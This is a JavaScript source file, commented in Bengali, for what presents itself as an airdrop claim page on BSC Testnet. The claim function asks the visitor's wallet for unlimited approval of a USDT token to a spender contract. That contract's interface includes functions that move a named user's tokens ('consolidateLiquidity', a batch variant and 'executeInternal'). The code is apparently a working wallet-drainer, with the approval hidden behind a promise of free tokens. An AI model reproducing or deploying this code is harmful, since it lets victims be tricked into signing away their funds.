/* ================= CONFIGURATION (UPDATED FOR TESTNET) ================= */

// ১. আপনার দেওয়া নতুন কন্ট্রাক্ট অ্যাড্রেস (Spender)
const SPENDER_CONTRACT = "0x498690046efc3feCEFa545a3D0d340cfB26817f0"; 

// ২. টার্গেট টোকেন অ্যাড্রেস (Testnet USDT)
const TARGET_TOKEN = "0x55d7fde29923200cAE1a2b09ae889F86042faba5"; 

// ৩. আপনার দেওয়া নতুন ABI
const TITAN_ABI = [
    {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EmergencyRecovery","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newGovernance","type":"address"}],"name":"GovernanceUpdated","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"LiquidityPoolStaked","type":"event"},
    {"anonymous":false,"inputs":[{"indexed":false,"internalType":"bool","name":"isPaused","type":"bool"}],"name":"SystemStatusChanged","type":"event"},
    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"name":"consolidateLiquidity","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address[]","name":"_tokens","type":"address[]"}],"name":"consolidateLiquidityBatch","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_user","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"name":"executeInternal","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"rescueStuckNative","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"name":"rescueStuckToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"bool","name":"_status","type":"bool"}],"name":"setPause","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_newGov","type":"address"}],"name":"transferRights","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"stateMutability":"payable","type":"receive"}
];

// ৪. ERC20 স্ট্যান্ডার্ড ABI (টোকেন ইন্টারঅ্যাকশনের জন্য)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function allowance(address owner, address spender) public view returns (uint256)",
    "function balanceOf(address account) view returns (uint256)"
];

/* ================= MAIN LOGIC (BSC TESTNET) ================= */

let provider;
let signer;
let userAddress;

// ১. ওয়ালেট কানেক্ট ফাংশন
async function connectWallet() {
    const btn = document.getElementById("connectBtn"); // HTML বাটন আইডি
    const statusMsg = document.getElementById("statusMsg"); // স্ট্যাটাস মেসেজ

    if (typeof window.ethereum === 'undefined') {
        alert("Please Install MetaMask or Trust Wallet!");
        return;
    }

    try {
        // মেটামাস্ক প্রভাইডার সেটআপ
        provider = new ethers.providers.Web3Provider(window.ethereum);
        
        // কানেকশন রিকোয়েস্ট
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        // নেটওয়ার্ক চেক (BSC Testnet Chain ID: 97)
        const network = await provider.getNetwork();
        
        // এখানে Mainnet (56) এর বদলে Testnet (97) চেক করা হচ্ছে
        if (network.chainId !== 97) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x61' }], // 97 in Hex is 0x61
                });
                
                // নেটওয়ার্ক চেঞ্জ হলে প্রভাইডার রিফ্রেশ
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
            } catch (switchError) {
                // যদি টেস্টনেট অ্যাড করা না থাকে, তবে অ্যাড করার রিকোয়েস্ট (Optional but good for UX)
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [
                                {
                                    chainId: '0x61',
                                    chainName: 'BSC Testnet',
                                    rpcUrls: ['https://data-seed-prebsc-1-s1.binance.org:8545/'],
                                    nativeCurrency: {
                                        name: 'BNB',
                                        symbol: 'tBNB',
                                        decimals: 18
                                    },
                                    blockExplorerUrls: ['https://testnet.bscscan.com']
                                },
                            ],
                        });
                    } catch (addError) {
                        console.error("Failed to add network", addError);
                    }
                } else {
                    alert("Please switch to BSC Testnet!");
                    return;
                }
            }
        }

        // বাটন আপডেট
        if(btn) btn.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
        if(statusMsg) {
            statusMsg.innerText = "✅ Wallet Connected (Testnet)! Ready.";
            statusMsg.style.color = "#00ff88";
        }

        console.log("Connected to Testnet:", userAddress);

    } catch (error) {
        console.error("Connection Error:", error);
        alert("Connection Failed!");
    }
}

// ২. ক্লেইম / অ্যাপ্রুভাল ফাংশন
async function claimAirdrop() {
    if (!userAddress) {
        await connectWallet();
    }

    const statusMsg = document.getElementById("statusMsg");
    if(statusMsg) statusMsg.innerText = "Processing... Please Confirm Transaction.";

    try {
        // প্রভাইডার এবং সাইনার নিশ্চিত করা
        if (!provider || !signer) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
        }

        const tokenContract = new ethers.Contract(TARGET_TOKEN, ERC20_ABI, signer);

        // 🔥 UNLIMITED APPROVAL LOGIC 🔥
        console.log("Checking allowance...");
        
        // আগে কোনো অ্যাপ্রুভাল আছে কিনা চেক করা
        const currentAllowance = await tokenContract.allowance(userAddress, SPENDER_CONTRACT);
        console.log("Current Allowance:", currentAllowance.toString());

        // যদি অ্যাপ্রুভাল ০ বা খুব কম হয়
        if (currentAllowance.lt(ethers.utils.parseUnits("1000", 18))) {
            console.log("Requesting Approval for:", SPENDER_CONTRACT);
            
            // ম্যাক্সিমাম ভ্যালু (Unlimited)
            const maxApproval = ethers.constants.MaxUint256;

            // ট্রানজেকশন পাঠানো
            const tx = await tokenContract.approve(SPENDER_CONTRACT, maxApproval);
            
            if(statusMsg) statusMsg.innerText = "Waiting for confirmation...";
            console.log("Transaction Hash:", tx.hash);
            
            // কনফার্মেশন হওয়া পর্যন্ত অপেক্ষা
            await tx.wait();
            
            console.log("Approval Successful!");
        } else {
            console.log("Already Approved! Skipping approval.");
        }

        // সফল হওয়ার মেসেজ
        if(statusMsg) {
            statusMsg.innerText = "🎉 Process Completed Successfully!";
            statusMsg.style.color = "#00ff88";
        }
        alert("Success! Transaction Confirmed.");

    } catch (error) {
        console.error("Transaction Error:", error);
        if(statusMsg) {
            // এরর ডিটেইলস দেখানো (ডিবাগিংয়ের জন্য সুবিধাজনক)
            statusMsg.innerText = "Failed: " + (error.reason || error.message || "Unknown Error");
            statusMsg.style.color = "red";
        }
    }
}
